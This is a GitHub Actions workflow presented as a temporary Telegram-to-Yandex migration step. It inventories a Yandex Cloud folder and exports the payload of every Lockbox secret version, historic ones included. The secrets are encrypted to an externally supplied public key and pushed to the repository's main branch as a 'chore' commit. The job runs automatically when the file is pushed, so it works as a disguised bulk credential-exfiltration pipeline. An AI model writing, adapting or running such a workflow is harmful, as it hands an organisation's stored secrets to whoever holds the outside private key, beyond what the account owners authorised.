name: Telegram encrypted bundle commit 2026-09-17 temp

on:
  push:
    branches: [main]
    paths:
      - ".github/workflows/telegram-encrypted-bundle-commit-20260917-temp.yml"

permissions:
  contents: write

env:
  FOLDER_ID: b1gk4p83brasi8g811jv
  MIGRATION_PUBLIC_KEY_B64: 

jobs:
  stage:
    runs-on: ubuntu-latest
    environment: test
    timeout-minutes: 20
    env:
      YC_SERVICE_ACCOUNT_KEY_JSON: ${{ secrets.YC_SERVICE_ACCOUNT_KEY_JSON }}
    steps:
      - name: Checkout main
        uses: actions/checkout@v4
        with:
          ref: main
          fetch-depth: 1

      - name: Install Yandex CLI and crypto
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p "$RUNNER_TEMP/yc"
          wget -q -O "$RUNNER_TEMP/yc/yc.tgz" https://storage.yandexcloud.net/yandexcloud-yc/release/yc_linux_amd64.tar.gz
          tar -xzf "$RUNNER_TEMP/yc/yc.tgz" -C "$RUNNER_TEMP/yc"
          chmod +x "$RUNNER_TEMP/yc/yc"
          python -m pip install --quiet cryptography
          key="$RUNNER_TEMP/key.json"
          printf '%s' "$YC_SERVICE_ACCOUNT_KEY_JSON" > "$key"
          chmod 600 "$key"
          "$RUNNER_TEMP/yc/yc" config profile create tg-migrate-stage >/dev/null 2>&1 || true
          "$RUNNER_TEMP/yc/yc" config profile activate tg-migrate-stage >/dev/null
          "$RUNNER_TEMP/yc/yc" config set service-account-key "$key" >/dev/null
          "$RUNNER_TEMP/yc/yc" config set folder-id "$FOLDER_ID" >/dev/null

      - name: Build encrypted bundle file
        shell: bash
        run: |
          set -euo pipefail
          export YC_BIN="$RUNNER_TEMP/yc/yc"
          mkdir -p migration-temp
          python - <<'PY'
          import base64, json, os, subprocess, time, urllib.parse, urllib.request
          from pathlib import Path
          from cryptography.hazmat.primitives import hashes, serialization
          from cryptography.hazmat.primitives.asymmetric import padding
          from cryptography.hazmat.primitives.ciphers.aead import AESGCM

          folder=os.environ['FOLDER_ID']; yc=os.environ['YC_BIN']
          def yc_json(*args):
              p=subprocess.run([yc,*args,'--folder-id',folder,'--format','json','--no-user-output'],capture_output=True,text=True,timeout=120)
              if p.returncode!=0: return {'_error':(p.stderr or p.stdout or '')[-2000:],'_args':list(args)}
              try: return json.loads(p.stdout)
              except Exception: return {'_error':'invalid json','_args':list(args)}
          token=subprocess.run([yc,'iam','create-token'],capture_output=True,text=True,timeout=60,check=True).stdout.strip()
          def get_json(url):
              req=urllib.request.Request(url,headers={'Authorization':f'Bearer {token}'})
              with urllib.request.urlopen(req,timeout=60) as r: return json.loads(r.read().decode())
          def paged(url,key):
              out=[]; page=None
              while True:
                  full=url+('&' if '?' in url else '?')+'pageSize=1000'
                  if page: full+='&pageToken='+urllib.parse.quote(page,safe='')
                  data=get_json(full); out.extend(data.get(key,[])); page=data.get('nextPageToken')
                  if not page: return out
          inv={
              'generated_at_epoch':int(time.time()),'folder_id':folder,
              'instances':yc_json('compute','instance','list'),
              'disks':yc_json('compute','disk','list'),
              'buckets':yc_json('storage','bucket','list'),
              'serverless_containers':yc_json('serverless','container','list'),
              'api_gateways':yc_json('serverless','api-gateway','list'),
              'ydb_databases':yc_json('ydb','database','list'),
              'registries':yc_json('container','registry','list')}
          inv['bucket_stats']=[]
          if isinstance(inv['buckets'],list):
              for b in inv['buckets']:
                  if b.get('name'): inv['bucket_stats'].append({'name':b['name'],'stats':yc_json('storage','bucket','stats',b['name'])})
          secrets=paged(f'https://lockbox.api.cloud.yandex.net/lockbox/v1/secrets?folderId={urllib.parse.quote(folder)}','secrets')
          secret_bundle=[]
          for sec in secrets:
              sid=sec['id']; versions=paged(f'https://lockbox.api.cloud.yandex.net/lockbox/v1/secrets/{urllib.parse.quote(sid)}/versions','versions'); exp=[]
              for v in versions:
                  item={'metadata':v,'payload_status':v.get('status'),'payload':None}
                  if v.get('status')!='DESTROYED':
                      try:
                          item['payload']=get_json(f'https://payload.lockbox.api.cloud.yandex.net/lockbox/v1/secrets/{urllib.parse.quote(sid)}/payload?versionId={urllib.parse.quote(v["id"])}'); item['payload_status']='EXPORTED'
                      except Exception as e: item['payload_status']='ERROR:'+type(e).__name__
                  exp.append(item)
              try: current=get_json(f'https://payload.lockbox.api.cloud.yandex.net/lockbox/v1/secrets/{urllib.parse.quote(sid)}/payload')
              except Exception as e: current={'_error':type(e).__name__}
              secret_bundle.append({'secret':sec,'versions':exp,'current_payload':current})
          raw=json.dumps({'inventory':inv,'lockbox':secret_bundle},ensure_ascii=False,separators=(',',':')).encode()
          pub=serialization.load_pem_public_key(base64.b64decode(os.environ['MIGRATION_PUBLIC_KEY_B64']))
          aes=AESGCM.generate_key(bit_length=256); nonce=os.urandom(12); aad=b'telegram-yandex-migration-bundle-20260917'
          ct=AESGCM(aes).encrypt(nonce,raw,aad)
          ek=pub.encrypt(aes,padding.OAEP(mgf=padding.MGF1(hashes.SHA256()),algorithm=hashes.SHA256(),label=None))
          env={'v':1,'ek':base64.b64encode(ek).decode(),'nonce':base64.b64encode(nonce).decode(),'ct':base64.b64encode(ct).decode()}
          Path('migration-temp/telegram-yandex-bundle-20260917.enc').write_text(base64.b64encode(json.dumps(env,separators=(',',':')).encode()).decode(),encoding='ascii')
          print(f'ENCRYPTED_BUNDLE_FILE=PASS plaintext_bytes={len(raw)} ciphertext_file_bytes={Path("migration-temp/telegram-yandex-bundle-20260917.enc").stat().st_size}')
          PY

      - name: Commit ciphertext only
        shell: bash
        run: |
          set -euo pipefail
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git add migration-temp/telegram-yandex-bundle-20260917.enc
          git commit -m 'chore: stage encrypted Telegram migration bundle' || true
          git push origin HEAD:main
          echo ENCRYPTED_BUNDLE_COMMIT=PASS

      - name: Cleanup key
        if: always()
        run: rm -f "$RUNNER_TEMP/key.json"
